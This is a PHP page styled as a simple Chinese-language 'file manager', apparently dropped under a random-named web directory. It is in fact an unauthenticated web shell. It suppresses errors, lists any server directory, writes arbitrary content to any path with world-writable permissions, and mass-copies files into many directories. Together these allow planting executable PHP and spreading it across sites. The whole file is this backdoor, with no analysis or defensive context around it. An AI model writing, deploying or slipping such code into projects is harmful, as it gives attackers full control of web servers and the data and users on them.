/gdgfdhtdgfdgfdgfdgdf/
<?php
error_reporting(0);

// 当前访问路径
$current = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(__DIR__);
if (!$current || !is_dir($current)) $current = realpath(__DIR__);

$parent = dirname($current);
$items = scandir($current);
$createFileMsg = '';

// 📝 创建文件
if (isset($_POST['create_file'])) {
    $newFilePath = trim($_POST['new_file_path']);
    $newFileContent = $_POST['new_file_content'];

    if (!empty($newFilePath)) {
        $newDir = dirname($newFilePath);
        if (!is_dir($newDir)) mkdir($newDir, 0777, true);
        if (file_put_contents($newFilePath, $newFileContent) !== false) {
            $createFileMsg = "<div style='padding:10px; background:#d4edda; color:#155724;'>✅ 创建成功：<code>$newFilePath</code></div>";
        } else {
            $createFileMsg = "<div style='padding:10px; background:#f8d7da; color:#721c24;'>❌ 写入失败：<code>$newFilePath</code></div>";
        }
    } else {
        $createFileMsg = "<div style='padding:10px; background:#fff3cd; color:#856404;'>⚠️ 文件路径不能为空</div>";
    }
}

// 📁 批量复制
if (isset($_POST['copy_files'])) {
    $sourceFiles = array_filter(array_map('trim', explode("\n", $_POST['source_files'])));
    $targetDirs = array_filter(array_map('trim', explode("\n", $_POST['target_dirs'])));

    foreach ($sourceFiles as $sourceFile) {
        if (!file_exists($sourceFile)) continue;
        $filename = basename($sourceFile);
        foreach ($targetDirs as $targetDir) {
            $targetDir = rtrim($targetDir, '/') . '/';
            if (!is_dir($targetDir)) mkdir($targetDir, 0777, true);
            copy($sourceFile, $targetDir . $filename);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>文件管理器</title>
    <style>
        body { font-family: Arial; padding: 30px; background: #f3f3f3; }
        .container { background: white; padding: 20px; border-radius: 10px; width: 800px; margin: auto; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; }
        input[type="submit"] { width: auto; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        input[type="submit"]:hover { background: #0056b3; }
        code { background: #f8f8f8; padding: 2px 4px; border-radius: 3px; }
        ul { list-style: none; padding-left: 0; }
        li { padding: 5px 0; }
        a { text-decoration: none; color: #007bff; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>

<div class="container">
    <h2>📂 当前目录：</h2>
    <p><code><?= htmlspecialchars($current) ?></code></p>

    <?php if ($current !== '/'): ?>
        <p>🔙 <a href="?dir=<?= urlencode($parent) ?>">返回上级目录</a></p>
    <?php endif; ?>

    <ul>
        <?php foreach ($items as $item):
            if ($item === '.' || $item === '..') continue;
            $fullPath = $current . DIRECTORY_SEPARATOR . $item;
        ?>
        <li>
            <?= is_dir($fullPath) ? '📁' : '📄' ?>
            <?php if (is_dir($fullPath)): ?>
                <a href="?dir=<?= urlencode($fullPath) ?>"><?= htmlspecialchars($item) ?>/</a>
            <?php else: ?>
                <?= htmlspecialchars($item) ?>
            <?php endif; ?>
        </li>
        <?php endforeach; ?>
    </ul>
</div>

<div class="container">
    <h2>📁 批量复制文件</h2>
    <form method="post">
        <label>源文件路径（每行一个）</label>
        <textarea name="source_files" rows="6" required></textarea>
        <label>目标目录路径（每行一个）</label>
        <textarea name="target_dirs" rows="6" required></textarea>
        <input type="submit" name="copy_files" value="批量复制">
    </form>
</div>

<div class="container">
    <h2>📝 创建新文件</h2>
    <?= $createFileMsg ?>
    <form method="post">
        <label>📄 文件完整路径</label>
        <input type="text" name="new_file_path" placeholder="/path/to/file.txt" required>
        <label>📋 文件内容</label>
        <textarea name="new_file_content" rows="5" required></textarea>
        <input type="submit" name="create_file" value="创建文件">
    </form>
</div>

</body>
</html>
